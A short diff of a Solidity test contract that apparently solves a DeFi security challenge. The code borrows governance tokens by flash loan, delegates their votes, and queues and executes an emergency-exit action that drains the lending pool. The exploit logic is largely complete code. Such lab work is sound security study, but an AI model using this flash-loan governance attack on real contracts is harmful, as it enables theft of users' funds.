@@ -29,7 +29,7 @@ contract Attacker is IERC3156FlashBorrower, Test {
 
     function attack(address token) external{
         pool.flashLoan(IERC3156FlashBorrower(this),address(token),TOKENS_IN_POOL,"");
-        // console.log(token.balanceOf(address(this)));
+        console.log(votingToken.balanceOf(address(this)));
     }
 
     function onFlashLoan(
@@ -42,6 +42,8 @@ contract Attacker is IERC3156FlashBorrower, Test {
         votingToken.delegate(address(this));
         uint256 actionId = governance.queueAction(address(pool),0,abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
         
+        votingToken.approve(attacker,TOKENS_IN_POOL);
+        votingToken.transfer(address(pool),TOKENS_IN_POOL);
         vm.warp(block.timestamp + governance.getActionDelay() + 1);
         governance.executeAction(actionId);
 
